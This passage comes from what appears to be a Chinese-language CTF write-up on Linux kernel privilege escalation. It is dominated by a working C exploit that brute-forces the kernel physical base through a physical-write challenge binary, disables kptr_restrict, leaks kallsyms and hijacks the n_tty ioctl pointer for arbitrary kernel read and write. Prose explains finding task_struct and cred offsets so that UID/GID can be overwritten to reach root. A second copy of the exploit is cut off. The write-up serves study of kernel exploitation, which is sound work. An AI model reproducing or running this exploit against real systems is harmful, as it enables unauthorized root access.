class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> modprobe_start = <span class="number">0x300c6c20</span>;</span><br><span class="line"><span class="type">u_int64_t</span> tmpa = <span class="number">0x612f706d742f</span>;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_physical_base;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_virtual_base;</span><br><span class="line"><span class="type">u_int64_t</span> kptr_restrict_offset = <span class="number">0x1ff49e0</span>;</span><br><span class="line"><span class="type">u_int64_t</span> modprobe_path_offset = <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> n_tty_ioctl_offset = <span class="number">0x1eff4e0</span> + <span class="number">0x38</span>; <span class="comment">// n_tty_ops + 0x38</span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> mov_rdx_to_rax_offset = <span class="number">0xe94f2b</span>; <span class="comment">// aar gadget</span></span><br><span class="line"><span class="type">u_int64_t</span> mov_esi_to_rdx_offset = <span class="number">0x1084c7a</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> origin_ioctl_pointer_offset = <span class="number">0xc786c0</span>; <span class="comment">// origin n_tty_ops ioctl pointer</span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> INIT_TASK_offset = <span class="number">0x1c0d0c0</span>;</span><br><span class="line"><span class="type">u_int64_t</span> INIT_TASK;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> mov_rdx_to_rax;</span><br><span class="line"><span class="type">u_int64_t</span> mov_esi_to_rdx;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> ret ;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0xffffffff81e94f2b: mov rax, [rdx]; ret;</span></span><br><span class="line"><span class="comment">0xffffffff82084c7a: mov [rdx], esi; ret;</span></span><br><span class="line"><span class="comment">0xffffffff82c0d0c0 T init_task</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> my_pid;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_phy</span><span class="params">(<span class="type">u_int64_t</span> address, <span class="type">u_int64_t</span> value)</span>&#123;</span><br><span class="line">    <span class="type">char</span> command[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(command, <span class="string">&quot;/usr/sbin/chall 0x%lx 0x%lx&quot;</span>, address, value);</span><br><span class="line">    <span class="comment">// puts(&quot;[!] Try to write&quot;);</span></span><br><span class="line">    <span class="built_in">puts</span>(command);</span><br><span class="line">    system(command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_modprobepath</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(buf, <span class="number">0x50</span>, <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;/usr/sbin/modprobe\n&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] Find kernel physical base\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_kptr_restrict</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo [!]kptr_restrict:$(cat /proc/sys/kernel/kptr_restrict)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cat_kallsyms</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    fp = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening /proc/kallsyms&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;modprobe_path&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx&quot;</span>, &amp;kernel_virtual_base);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_virtual_base = kernel_virtual_base - modprobe_path_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kernel_virtual_base != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel Virtual base : 0x%lx\n&quot;</span>, kernel_virtual_base);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path not found\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">GETPID</span><span class="params">()</span>&#123;</span><br><span class="line">    my_pid = getpid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] PID : %d\n&quot;</span>, my_pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int32_t</span> <span class="title function_">aar_virtual_memory_4</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="type">u_int64_t</span> w_r_address)</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, mov_rdx_to_rax);</span><br><span class="line">    <span class="type">u_int32_t</span> retval;</span><br><span class="line">    retval = ioctl(fd, cmd, w_r_address);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> <span class="title function_">aar_virtual_memory_8</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="type">u_int64_t</span> w_r_address)</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, mov_rdx_to_rax);</span><br><span class="line">    <span class="type">u_int64_t</span> retval1;</span><br><span class="line">    <span class="type">u_int64_t</span> retval2;</span><br><span class="line">    <span class="type">u_int64_t</span> retval;</span><br><span class="line">    retval1 = ioctl(fd, cmd, w_r_address);</span><br><span class="line">    retval2 = ioctl(fd, cmd, w_r_address + <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">    retval = retval1 + (retval2 &lt;&lt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">aaw_virtual_memory_4</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="type">u_int64_t</span> w_w_address)</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, mov_esi_to_rdx);</span><br><span class="line">    ioctl(fd, cmd, w_w_address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recover_ioctl_pointer</span><span class="params">()</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, kernel_virtual_base + origin_ioctl_pointer_offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        write_phy(modprobe_start, tmpa);</span><br><span class="line">        <span class="keyword">if</span> (check_modprobepath() == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel physical modprobe : 0x%lx\n&quot;</span>, modprobe_start);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        modprobe_start -= <span class="number">0x100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_physical_base = modprobe_start - <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel physical base : 0x%lx\n&quot;</span>, kernel_physical_base);</span><br><span class="line"></span><br><span class="line">    write_phy(kernel_physical_base + kptr_restrict_offset, <span class="number">0</span>);</span><br><span class="line">    check_kptr_restrict();</span><br><span class="line">    cat_kallsyms();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;==== leak end ====&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    GETPID();</span><br><span class="line"></span><br><span class="line">    mov_rdx_to_rax = mov_rdx_to_rax_offset + kernel_virtual_base;</span><br><span class="line">    mov_esi_to_rdx = mov_esi_to_rdx_offset + kernel_virtual_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] mov rax, [rdx] (AAR gadget) : %lx \n&quot;</span>, mov_rdx_to_rax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] mov [rdx], esi (AAW gadget) : %lx \n&quot;</span>, mov_esi_to_rdx);</span><br><span class="line"></span><br><span class="line">    INIT_TASK = INIT_TASK_offset + kernel_virtual_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] init_task : %lx\n&quot;</span>, INIT_TASK);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_NOCTTY | O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ret = aar_virtual_memory_8(fd, 0,  n_tty_ioctl_offset + kernel_virtual_base);</span></span><br><span class="line">    <span class="comment">// printf(&quot;[!] W_READ : %lx\n&quot;, ret);</span></span><br><span class="line">    <span class="comment">// aaw_virtual_memory_4(fd, 0x1234, n_tty_ioctl_offset + kernel_virtual_base);</span></span><br><span class="line"></span><br><span class="line">    recover_ioctl_pointer();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="EoP"><a href="#EoP" class="headerlink" title="EoP"></a>EoP</h2><p>我們知道每個 process (task_struct)，並且都有 struct cred 用來管理自己的權限<br>如果我們能找到自己這支 process 的 cred struct address<br>並寫掉 UID、GID<br>就可以成功提權</p>
<p>但我們要找到自己 process 的 task_struct 並不容易<br>想到的方法是通過 task_struct PID 識別</p>
<p>然後去 traverse 整條 task_struct</p>
<p>先了解 task 這件事</p>
<h3 id="init-process"><a href="#init-process" class="headerlink" title="init process"></a>init process</h3><p>init process 是 linux 啟動的第一個 process (又稱 idle process)<br>在 start_kernel 時被創建的</p>
<p><img src="https://hackmd.io/_uploads/HJ7C-D7Rkg.png" alt="image"></p>
<p>start kernel 會去 init 很多不同的東西<br>主要的 OS 資料結構，基礎設施及子系統都由這邊進行 init</p>
<p>首先會先自己設定本身的 task_struct (init_task)<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/init/main.c#L901">https://elixir.bootlin.com/linux/v6.14-rc4/source/init/main.c#L901</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_task_stack_end_magic(&amp;init_task);</span><br></pre></td></tr></table></figure>

<p>最後會呼叫 <code>rest_init()</code>，到此已經完成了 OS 最核心部份的初始化，基本上 OS 已經算可以動了</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/init/main.c#L1098">https://elixir.bootlin.com/linux/v6.14-rc4/source/init/main.c#L1098</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Do the rest non-__init&#x27;ed, we&#x27;re now alive */</span></span><br><span class="line">rest_init();</span><br></pre></td></tr></table></figure>

<p><code>rest_init()</code> 會 create 兩個 process，kernel_init 及 kthreadd<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/init/main.c#L743">https://elixir.bootlin.com/linux/v6.14-rc4/source/init/main.c#L743</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We need to spawn init first so that it obtains pid 1, however</span></span><br><span class="line"><span class="comment"> * the init task will end up wanting to create kthreads, which, if</span></span><br><span class="line"><span class="comment"> * we schedule it before we create kthreadd, will OOPS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">pid = user_mode_thread(kernel_init, <span class="literal">NULL</span>, CLONE_FS);</span><br><span class="line">...</span><br><span class="line">pid = kernel_thread(kthreadd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CLONE_FS | CLONE_FILES);</span><br></pre></td></tr></table></figure>

<p>最後自己會 call 進去這裡，成為 pid &#x3D; 0 的 idle process<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/kernel/sched/idle.c#L417">https://elixir.bootlin.com/linux/v6.14-rc4/source/kernel/sched/idle.c#L417</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cpu_startup_entry</span><span class="params">(<span class="keyword">enum</span> cpuhp_state state)</span></span><br><span class="line">&#123;</span><br><span class="line">	current-&gt;flags |= PF_IDLE;</span><br><span class="line">	arch_cpu_idle_prepare();</span><br><span class="line">	cpuhp_online_idle(state);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		do_idle();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://danielmaker.github.io/blog/linux/start_kernel.html">https://danielmaker.github.io/blog/linux/start_kernel.html</a></p>
<h3 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h3><p>留個坑之後補<br>總之 tasks 會以 double linklist 方式串起來</p>
<p>PID0 &lt;-&gt; PID1 &lt;-&gt; PID …</p>
<p><img src="https://hackmd.io/_uploads/rytJGdUR1e.png" alt="image"></p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/include/linux/sched.h#L791">https://elixir.bootlin.com/linux/v6.14-rc4/source/include/linux/sched.h#L791</a></p>
<h3 id="找-offset-問題"><a href="#找-offset-問題" class="headerlink" title="找 offset 問題"></a>找 offset 問題</h3><p>嘗試了很多方法都沒辦法找到 PID、cred、task linklist offset<br>所以覺得直接逆 vmlinux 來找 offset</p>
<p>PID 找這裡<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/kernel/exit.c#L992">https://elixir.bootlin.com/linux/v6.14-rc4/source/kernel/exit.c#L992</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(!tsk-&gt;pid))</span><br><span class="line">	panic(<span class="string">&quot;Attempted to kill the idle task!&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ry9mJqNAkl.png" alt="image"><br>從這個往上追判斷式</p>
<p><img src="https://hackmd.io/_uploads/HyTVy54Ryg.png" alt="image"><br>PID offset : 0x9d0</p>
<p>cred 找這裡<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/kernel/cred.c#L117">https://elixir.bootlin.com/linux/v6.14-rc4/source/kernel/cred.c#L117</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">real_cred = (<span class="keyword">struct</span> cred *) tsk-&gt;real_cred;</span><br><span class="line">tsk-&gt;real_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">cred = (<span class="keyword">struct</span> cred *) tsk-&gt;cred;</span><br><span class="line">tsk-&gt;cred = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>0x17c * sizeof(QWORD) &#x3D; 0xbe0<br><img src="https://hackmd.io/_uploads/SkaPJq4CJl.png" alt="image"></p>
<p>tasks linklist 找這裡<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14-rc4/source/kernel/sched/rt.c#L386">https://elixir.bootlin.com/linux/v6.14-rc4/source/kernel/sched/rt.c#L386</a></p>
<p>先找他下面一點的 <code>pushable_tasks</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">tasks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span>		<span class="title">pushable_tasks</span>;</span></span><br></pre></td></tr></table></figure>

<p>這行上面有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">enqueue_pushable_task</span><span class="params">(<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	plist_del(&amp;p-&gt;pushable_tasks, &amp;rq-&gt;rt.pushable_tasks);</span><br></pre></td></tr></table></figure>

<p>offset 是 0x910 - struct head size(他是兩個 8 byte pointer，所以是 0x910 - 0x10 &#x3D; 0x900)</p>
<p><img src="https://hackmd.io/_uploads/rJwMZ54Ayx.png" alt="image"></p>
<h3 id="EoP-success"><a href="#EoP-success" class="headerlink" title="EoP success"></a>EoP success</h3><p>總之最後就寫個 traverse double linklist 的 code 找到自己 process 的 cred，在通過 aar 讀出 cred address，之後 aaw 都寫成 0，提權到 root<br>之後開個 shell<br>之前看 exploit</p>
<p>PS: 有個奇怪的問題我沒解決，就是原本會 crash，但是我把全域變數搬進一部分成區域變數就可以了</p>
<p><img src="https://hackmd.io/_uploads/Hk1t-T4C1x.png" alt="image"></p>
<p>反正執行完腳本就提權了<br><img src="https://hackmd.io/_uploads/ByyjZTN0yg.png" alt="image"></p>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/UqXhPvIuCJo?si=-9fFCJfnOqo7oMSD" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>這份 exploit 不是百分百成功，因為有可能出現剛好不在我們爆破的 physical address base 範圍</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> modprobe_start = <span class="number">0x300c6c20</span>;</span><br><span class="line"><span class="type">u_int64_t</span> tmpa = <span class="number">0x612f706d742f</span>;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_physical_base;</span><br><span class="line"><span class="type">u_int64_t</span> kernel_virtual_base;</span><br><span class="line"><span 